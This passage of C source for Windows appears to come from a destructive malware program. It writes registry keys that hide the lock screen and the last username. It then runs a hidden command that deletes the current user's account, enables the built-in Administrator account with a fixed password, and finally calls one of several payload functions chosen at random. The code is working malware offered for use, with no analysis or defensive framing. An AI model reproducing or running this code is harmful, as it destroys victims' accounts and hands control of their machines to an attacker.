	CreateThread(NULL, NULL, &payloadThread, &dark, NULL, NULL);
	onceinabluemoon();
	HKEY regHandle; // Disable Last UserName logon ui
	DWORD dwValue = 1;
	BYTE* data = (BYTE*)&dwValue;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Policies\\Microsoft\\Personalization"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
	RegSetValueEx(regHandle, TEXT("NoLockScreen"), 0, REG_DWORD, data, sizeof(DWORD));
	RegCloseKey(regHandle);

	HKEY regHandle2; // Disable Last UserName logon ui
	DWORD dwValue2 = 1;
	BYTE* data2 = (BYTE*)&dwValue2;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle2, NULL);
	RegSetValueEx(regHandle2, TEXT("dontdisplaylastusername"), 0, REG_DWORD, data2, sizeof(DWORD));
	RegCloseKey(regHandle2);

	ShellExecuteA(NULL, NULL, "cmd", " /c net user %username% /delete & net user Administrator /active:yes & net user Administrator iwantedthis", NULL, SW_HIDE);
	for (;;) {
		Sleep(10000);
	}

}
void randslastpayload() {
	srand(time(NULL));
	int choice = rand() % 4;
	switch (choice) {
	case 0:
		somerand();
		break;
	case 1:
		somerand2();
		break;
	case 2:
		somerand3();
		break;
	case 3:
		InEvitableHax();
		break;
	}
}
//#include <stdio.h>
//#include <stdlib.h>
//#include <time.h>


